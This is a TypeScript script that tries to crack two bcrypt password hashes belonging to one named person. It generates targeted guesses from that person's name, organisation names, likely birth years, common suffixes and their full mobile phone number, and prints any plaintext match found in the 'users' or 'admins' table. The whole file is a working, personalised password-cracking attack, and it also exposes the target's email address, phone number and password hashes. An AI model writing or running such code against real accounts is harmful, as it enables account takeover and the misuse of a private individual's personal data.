import bcrypt from 'bcryptjs';

const hash1 = '$2y$10$ZATLsMs6nGJ4XccbraJdeuSoYyuToM.gVqmZVOOAaLP5YaxpaQiuK'.replace('$2y$', '$2a$');
const hash2 = '$2y$10$K2p4.v8uWR5E398VZJo1neGPRbdJGIM90piXv/2JS9Pv/U42jVz6y'.replace('$2y$', '$2a$');

console.log('🔍 Cracking password for saiful@saimum.org...\n');

const baseWords = [
  'saiful', 'Saiful', 'SAIFUL',
  'mamun', 'Mamun', 'MAMUN',
  'mollik', 'Mollik', 'MOLLIK',
  'saifulmamun', 'SaifulMamun', 'saifulmollik', 'SaifulMollik',
  'saimum', 'Saimum', 'SAIMUM',
  'saimumacademy', 'SaimumAcademy',
  'shilpigosthi', 'Shilpigosthi',
  'admin', 'Admin', 'ADMIN',
  'administrator', 'Administrator',
  'password', 'Password',
  '123456', '12345678', '123456789', '1234567890',
  '01571258525', '1571258525', '258525',
  'saiful81', 'saiful85', 'saiful86', 'saiful87', 'saiful88', 'saiful89', 'saiful90',
  'saiful91', 'saiful92', 'saiful93', 'saiful94', 'saiful95', 'saiful96', 'saiful97', 'saiful98', 'saiful99', 'saiful00',
  'saimum@123', 'saimum@2025', 'saimum@2026', 'saimum@2024', 'saimum#123',
  'saiful@123', 'saiful@2025', 'saiful@2026', 'saiful@2024', 'saiful#123',
  'admin@123', 'admin@2025', 'admin@2026', 'admin@2024', 'admin#123',
  'Admin@123', 'Admin@2025', 'Admin@2026', 'Admin#123',
  'Saiful@123', 'Saiful@2025', 'Saiful@2026', 'Saiful#123',
  'Saiful@81', 'saiful@81'
];

const patterns: string[] = [];

baseWords.forEach(w => {
  patterns.push(w);
  const sufs = ['', '1', '12', '123', '1234', '12345', '123456', '@123', '@1234', '2024', '2025', '2026', '@2024', '@2025', '@2026', '!', '@', '#', '$', '%', '&', '*'];
  sufs.forEach(s => {
    patterns.push(w + s);
    patterns.push(w.toLowerCase() + s);
    patterns.push(w.toUpperCase() + s);
  });
});

// Add mobile phone combinations
const phone = '01571258525';
patterns.push(phone);
patterns.push('saiful' + phone);
patterns.push('Saiful' + phone);
patterns.push(phone.slice(-6));
patterns.push(phone.slice(-4));
patterns.push(phone.slice(-8));

console.log(`Generated ${patterns.length} targeted candidate patterns. Testing now...`);

let found = false;

for (let i = 0; i < patterns.length; i++) {
  const p = patterns[i];
  if (bcrypt.compareSync(p, hash1)) {
    console.log(`\n🎉🎉🎉 BOOM! MATCH FOUND IN USERS TABLE!`);
    console.log(`👉 Email: saiful@saimum.org`);
    console.log(`👉 Plain Password: "${p}"`);
    found = true;
    break;
  }
  if (bcrypt.compareSync(p, hash2)) {
    console.log(`\n🎉🎉🎉 BOOM! MATCH FOUND IN ADMINS TABLE!`);
    console.log(`👉 Email: saiful@saimum.org`);
    console.log(`👉 Plain Password: "${p}"`);
    found = true;
    break;
  }
}

if (!found) {
  console.log('\n❌ Not found in targeted list of patterns.');
}
